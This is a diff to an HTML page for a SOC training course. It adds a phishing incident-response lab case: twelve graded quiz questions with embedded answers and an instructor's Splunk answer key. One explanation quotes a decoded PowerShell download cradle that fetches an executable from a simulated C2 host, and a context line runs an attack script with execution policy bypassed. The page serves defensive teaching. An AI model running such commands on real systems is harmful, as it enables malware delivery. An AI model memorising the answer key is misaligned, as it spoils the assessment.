@@ -161,6 +161,36 @@ Set-ExecutionPolicy -Scope Process Bypass -Force ; .\attack-windows.ps1</code></
        <a href="../../session-06/index.html">Session 6 page</a>.</p>
   </div>
 
+  <!-- ============ SESSION 7 CARDS ============ -->
+  <h2 class="sec" id="s07" style="margin-top:34px">Session 7 · Email &amp; Phishing — Full Incident (IR + DF)</h2>
+  <p class="sec-desc">One reported email, three log sources. Prove the spoof from the headers, measure the blast radius
+     from the mail log, find the clicks in the proxy, then follow the payload into the endpoint — the complete arc from
+     <strong>Session 7</strong>.</p>
+  <div class="chal-grid">
+    <a class="chal-card hard" href="#cf-paper-trail" style="grid-column:1 / -1">
+      <h4>Operation Paper Trail — phishing → credential theft → macro payload → C2 → persistence</h4>
+      <span class="cc-idx">index=mail_logs + proxy_logs + sysmon</span>
+      <div class="cc-meta"><span class="diff hard">Full arc</span><span class="tag">12 Q · 3 datasets</span><span class="mitre">T1566→T1114.003</span></div>
+    </a>
+    <a class="chal-card med" href="../../session-07/index.html">
+      <h4>Session 7 — guided walkthrough</h4>
+      <span class="cc-idx">session-07 · P22–P23</span>
+      <div class="cc-meta"><span class="diff med">Lecture + lab</span><span class="tag">graded</span><span class="mitre">IR + DF</span></div>
+    </a>
+  </div>
+
+  <div class="box tip" id="run-papertrail" style="margin-top:16px">
+    <span class="box-t">How to ingest &amp; investigate (Session 7)</span>
+    <p>Three datasets, three indexes — ingest all three, because <strong>no single one answers the case</strong>:</p>
+<pre><code>paper-trail-mail.json      -> index=mail_logs     (Postfix delivery: who received it)
+paper-trail-proxy.json     -> index=proxy_logs    (FortiGate: who clicked, who submitted, the C2)
+paper-trail-endpoint.json  -> index=sysmon        (Sysmon + PowerShell + Security: what executed)</code></pre>
+    <p>Splunk → <strong>Add Data → Upload</strong> → source type <code>_json</code> → set the index → time range
+       <strong>All time</strong>. Start from the reported message, pivot on the <strong>sending IP</strong>, then on the
+       <strong>recipient list</strong>, then on the <strong>URL</strong>, then on the <strong>hash</strong>. Full brief on the
+       <a href="../../session-07/index.html">Session 7 page</a>.</p>
+  </div>
+
   <!-- ==================== CASE FILES ==================== -->
 
   <!-- CF: VPN -->
@@ -907,10 +937,214 @@ index=wineventlog EventID=1102 | table _time SubjectUserName</code></pre></detai
     </div>
   </div>
 
+  <!-- CF: OPERATION PAPER TRAIL (S7) -->
+  <div class="casefile hard" id="cf-paper-trail">
+    <div class="case-head"><h3>🔴 Full Incident · Operation Paper Trail</h3>
+      <div class="ch-tags"><span class="diff hard">Full arc</span><span class="tag">12 questions</span><span class="tag">3 datasets</span></div></div>
+    <div class="case-body">
+      <div class="brief"><b>Brief.</b> <b>06 Aug 2026, 14:32.</b> Sara Mahmoud in Finance used the <em>Report Phishing</em>
+        button on a supplier invoice she did not recognise — she did not open it. By 15:00 the SOC sees one host beaconing
+        outbound on a fixed interval. Work the case: prove the message was spoofed, find every recipient, find everyone who
+        interacted, follow the payload, and identify how the attacker kept access. <strong>Answer only from the evidence.</strong></div>
+      <div class="evidence">
+        <div class="ev"><span>Mail</span><b><code>index=mail_logs</code> · LNX-VICTIM01 <code>/var/log/maillog</code></b></div>
+        <div class="ev"><span>Network</span><b><code>index=proxy_logs</code> · FGT-FW01 web filter</b></div>
+        <div class="ev"><span>Endpoint</span><b><code>index=sysmon</code> · WIN-VICTIM01 Sysmon + PowerShell + Security</b></div>
+        <div class="ev"><span>Pivot on</span><b>src_ip · rcpt_to · dst_host · Hashes · ParentImage · User</b></div>
+      </div>
+      <div class="mitre-row"><span class="lbl">Kill chain</span><span class="mitre">T1566.001 Attachment</span><span class="mitre">T1566.002 Link</span><span class="mitre">T1204.002 User Execution</span><span class="mitre">T1059.001 PowerShell</span><span class="mitre">T1105 Download</span><span class="mitre">T1056 Input Capture</span><span class="mitre">T1071 C2</span><span class="mitre">T1547.001 Run Key</span><span class="mitre">T1078 Valid Accounts</span><span class="mitre">T1114.003 Forwarding Rule</span><span class="mitre">T1534 Internal Spearphishing</span></div>
+
+      <div class="q mcq" data-answer="b" data-why="Search index=mail_logs for spf=fail — only the campaign matches. The connection came from 203.0.113.77 announcing itself as supplier-invoices.top. The visible From: (contoso-supplies.com) is a spoof, and 198.51.100.10 is the legitimate Contoso mail server — the distractor.">
+        <p><span class="qn">Q1</span> Which IP address actually delivered the phishing campaign?</p>
+        <ul class="opts">
+          <li data-opt="a">198.51.100.10 (mail.contoso.com)</li>
+          <li data-opt="b">203.0.113.77 (supplier-invoices.top)</li>
+          <li data-opt="c">203.0.113.91 (invoice-portal.top)</li>
+          <li data-opt="d">185.199.108.77 (cdn-invoice-cdn.top)</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="d" data-why="The campaign carries spf=fail (the sending IP is not authorised for the claimed domain), dkim=none (no signature at all) and dmarc=fail. That combination on a message impersonating a known supplier is high-confidence spoofing.">
+        <p><span class="qn">Q2</span> What were the SPF, DKIM and DMARC results on the campaign messages?</p>
+        <ul class="opts">
+          <li data-opt="a">pass / pass / pass</li>
+          <li data-opt="b">pass / none / none</li>
+          <li data-opt="c">softfail / pass / quarantine</li>
+          <li data-opt="d">fail / none / fail</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="c" data-why="mail_logs | search src_ip=203.0.113.77 | stats dc(rcpt_to) returns 14. Sara only reported one copy — the other 13 recipients are invisible until you run the blast-radius search. This is the question most students get wrong by analysing only the reported message.">
+        <p><span class="qn">Q3</span> How many mailboxes received the campaign?</p>
+        <ul class="opts">
+          <li data-opt="a">1 — only the reporter</li>
+          <li data-opt="b">6</li>
+          <li data-opt="c">14</li>
+          <li data-opt="d">27</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="a" data-why="The Return-Path (envelope sender) is bounce@mail-delivery-svc.top and the Reply-To is accounts.contoso@mail-delivery-svc.top — a third domain, different from both the visible From: and the sending domain. Any reply leaves the organisation entirely.">
+        <p><span class="qn">Q4</span> The visible <code>From:</code> is <code>billing@contoso-supplies.com</code>. Which domain would actually receive a reply?</p>
+        <ul class="opts">
+          <li data-opt="a">mail-delivery-svc.top</li>
+          <li data-opt="b">contoso-supplies.com</li>
+          <li data-opt="c">supplier-invoices.top</li>
+          <li data-opt="d">itgate.local</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="b" data-why="proxy_logs | search dst_host=invoice-portal.top url=*/login shows two GETs: a.hassan at 14:31:08 and m.tarek at 15:02:47. The mail log proves delivery to 14 people; only the proxy proves who actually clicked.">
+        <p><span class="qn">Q5</span> How many users clicked the phishing link, and who were they?</p>
+        <ul class="opts">
+          <li data-opt="a">1 — a.hassan only</li>
+          <li data-opt="b">2 — a.hassan and m.tarek</li>
+          <li data-opt="c">2 — a.hassan and s.mahmoud</li>
+          <li data-opt="d">3 — a.hassan, m.tarek and n.fouad</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="c" data-why="Only a.hassan produced a POST to /submit.php (14:33:02, status 302 then redirected to microsoft.com to look legitimate). m.tarek loaded the page but never posted — he closed the tab. Clicking and submitting are two different events with two different responses.">
+        <p><span class="qn">Q6</span> Both users reached the page. Who actually submitted credentials?</p>
+        <ul class="opts">
+          <li data-opt="a">Both of them</li>
+          <li data-opt="b">m.tarek only</li>
+          <li data-opt="c">a.hassan only</li>
+          <li data-opt="d">Neither — no POST exists</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="a" data-why="Sysmon EID 1 shows OUTLOOK.EXE -> WINWORD.EXE (normal, the user opened the attachment) then WINWORD.EXE -> powershell.exe with -W Hidden -Enc (never normal). That second pair is the macro firing and is the single highest-value phishing detection on an endpoint.">
+        <p><span class="qn">Q7</span> Which parent-child pair in Sysmon proves the macro executed?</p>
+        <ul class="opts">
+          <li data-opt="a">WINWORD.EXE → powershell.exe</li>
+          <li data-opt="b">OUTLOOK.EXE → WINWORD.EXE</li>
+          <li data-opt="c">explorer.exe → OUTLOOK.EXE</li>
+          <li data-opt="d">powershell.exe → officeupd.exe</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="d" data-why="PowerShell script-block logging (EID 4104) captured the decoded cradle: IEX(New-Object Net.WebClient).DownloadFile('https://cdn-invoice-cdn.top/upd/officeupd.exe', ...). The -Enc command line is base64; 4104 is where you read what it actually did.">
+        <p><span class="qn">Q8</span> The PowerShell command line is base64-encoded. Which event reveals what it really did?</p>
+        <ul class="opts">
+          <li data-opt="a">Sysmon EID 1 (process create)</li>
+          <li data-opt="b">Sysmon EID 3 (network connect)</li>
+          <li data-opt="c">Security 4624 (logon)</li>
+          <li data-opt="d">PowerShell 4104 (script block logging)</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="b" data-why="Sysmon EID 11 records officeupd.exe written to the user's Temp folder with SHA256 9f2b4d61c8ae37f0... That hash is different from the .docm attachment hash (025ba9ce...) — the document is the delivery, the exe is the payload. Both are IOCs, and confusing them is a common error.">
+        <p><span class="qn">Q9</span> Which file did PowerShell write to disk, and where?</p>
+        <ul class="opts">
+          <li data-opt="a">Invoice_INV-2026-0873.docm in Downloads</li>
+          <li data-opt="b">officeupd.exe in <code>\AppData\Local\Temp\</code></li>
+          <li data-opt="c">payload.exe in <code>C:\ProgramData\</code></li>
+          <li data-opt="d">svchost.exe in <code>C:\Windows\System32\</code></li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="c" data-why="Both the proxy and Sysmon EID 3 show connections to cdn-invoice-cdn.top (185.199.108.77) at a fixed 300-second interval with near-identical byte counts. Fixed-interval, low-volume, repeated outbound traffic is the classic beaconing signature.">
+        <p><span class="qn">Q10</span> What is the C2 beacon interval, and to which host?</p>
+        <ul class="opts">
+          <li data-opt="a">60 seconds to invoice-portal.top</li>
+          <li data-opt="b">300 seconds to supplier-invoices.top</li>
+          <li data-opt="c">300 seconds to cdn-invoice-cdn.top</li>
+          <li data-opt="d">Random intervals to microsoft.com</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="a" data-why="Security 4624 shows a.hassan logging on from 198.51.100.42 at 14:52:44 — 26 minutes after delivery and 21 after the click, well inside the 30-minute window. This is exactly INE's correlation rule: phishing delivery + unusual login for the same user = confirmed compromise, not a queue item.">
+        <p><span class="qn">Q11</span> At 14:52 a logon appears for a.hassan from 198.51.100.42. Why does this confirm compromise?</p>
+        <ul class="opts">
+          <li data-opt="a">It is an unusual source for that user, within 30 minutes of the phishing delivery — the correlation rule fires</li>
+          <li data-opt="b">It is a Type 2 interactive logon</li>
+          <li data-opt="c">It came from the same IP as the mail server</li>
+          <li data-opt="d">It failed three times first</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <div class="q mcq" data-answer="d" data-why="The attacker created an inbox rule forwarding mail to archive.sync@mail-delivery-svc.top with DeleteMessage set — T1114.003. A password reset does NOT remove it, so the attacker keeps reading the mailbox. They then used the account to phish payroll, HR and n.fouad internally (T1534). Both must be remediated.">
+        <p><span class="qn">Q12</span> After the password reset, what would still leave the attacker with access?</p>
+        <ul class="opts">
+          <li data-opt="a">The Run key on the endpoint</li>
+          <li data-opt="b">The C2 beacon</li>
+          <li data-opt="c">The cached browser session</li>
+          <li data-opt="d">The inbox forwarding rule to mail-delivery-svc.top</li>
+        </ul>
+        <div class="mcq-fb"></div>
+      </div>
+
+      <details class="inst-spl"><summary>Instructor · SPL answer key &amp; hunt path</summary>
+<pre><code># ---------- 1. Find the campaign (Q1, Q2) ----------
+index=mail_logs spf=fail
+| stats count values(helo) values(header_from) values(reply_to) by src_ip
+#  -> 203.0.113.77 | supplier-invoices.top | billing@contoso-supplies.com | ...@mail-delivery-svc.top
+
+# ---------- 2. Blast radius (Q3, Q4) ----------
+index=mail_logs src_ip="203.0.113.77"
+| stats dc(rcpt_to) AS mailboxes values(attachment) values(mail_from)
+#  -> 14 mailboxes | Invoice_INV-2026-0873.docm | bounce@mail-delivery-svc.top
+
+# ---------- 3. Who interacted (Q5, Q6) ----------
+index=proxy_logs dst_host="invoice-portal.top"
+| stats count by src_user, method, url
+#  -> a.hassan GET /login 14:31 + POST /submit.php 14:33  |  m.tarek GET /login 15:02 (no POST)
+
+# ---------- 4. Execution chain (Q7, Q8, Q9) ----------
+index=sysmon EventID=1 ParentImage="*WINWORD.EXE" Image="*powershell.exe"
+| table _time User ParentImage Image CommandLine
+index=sysmon EventID=4104 | table _time User CommandLine     # decoded cradle
+index=sysmon EventID=11 | table _time TargetFilename Hashes   # officeupd.exe + SHA256
+
+# ---------- 5. Beaconing (Q10) ----------
+index=proxy_logs dst_host="cdn-invoice-cdn.top" url="*/api/checkin"
+| streamstats current=f last(_time) AS prev BY src_user
+| eval gap=prev-_time | stats values(gap) count
+#  -> gap is constant 300s, 39 beacons
+
+# ---------- 6. Correlation rule (Q11) ----------
+index=sysmon EventID=4624 IpAddress="198.51.100.42" | table _time User LogonType IpAddress
+#  -> a.hassan 14:52:44 (type 3) + 14:53:02 (type 10) = 26 min after delivery -> rule fires
+
+# ---------- 7. Persistence the reset does not fix (Q12) ----------
+index=sysmon EventID=13 | table _time TargetObject Details      # Run key OfficeUpdateSvc
+index=sysmon CommandLine="*New-InboxRule*" | table _time CommandLine
+index=mail_logs mail_from="a.hassan@itgate.local" subject="*bank details*"   # T1534
+
+# ---------- IOC block for the report (defanged) ----------
+# 203[.]113[.]77          sending mail server
+# supplier-invoices[.]top   origin domain
+# mail-delivery-svc[.]top   Return-Path / Reply-To / forwarding target
+# invoice-portal[.]top      credential harvest (203[.]0[.]113[.]91)
+# cdn-invoice-cdn[.]top     C2 (185[.]199[.]108[.]77) beacon 300s
+# Invoice_INV-2026-0873.docm  025ba9ce4a2118a9ca7b115c8869ff73bc16bad3732ba359cef1e60ad8f961f9
+# officeupd.exe               9f2b4d61c8ae37f05b1e94c2d7a860f3e5b81c47a92d6e30f8b5471c9d2e6a08
+# HKCU\...\Run\OfficeUpdateSvc
+
+# ---------- Distractors students fall for ----------
+# 198.51.100.10  = the LEGITIMATE Contoso mail server (spf/dkim/dmarc all pass)
+# billing@contoso.com "Invoice INV-2026-0790 - paid, thank you" 11:14 = genuine, clean auth
+# invoices.contoso.com visited by n.fouad 13:12 = legitimate supplier portal, not the phish
+# 4 benign attachments during the day (xlsx/pdf/png) = normal business mail</code></pre></details>
+    </div>
+  </div>
+
   <div class="box tip" style="margin-top:24px"><span class="box-t">How to run this in class</span>
     <p>Give students the dataset + questions only. They ingest, investigate, and answer. Reveal the SPL and the
-       answer feedback for grading. Session 2 cases cover SIEM basics; Session 3 cases drill telemetry &amp; pivoting.
-       Harder DFIR cases (memory, disk) arrive in Sessions 10–11.</p></div>
+       answer feedback for grading. Session 2 cases cover SIEM basics; Session 3 cases drill telemetry &amp; pivoting;
+       Sessions 6–7 run the full IR + DF arc. Harder DFIR cases (memory, disk) arrive in Sessions 10–11.</p></div>
 
 </main>
 
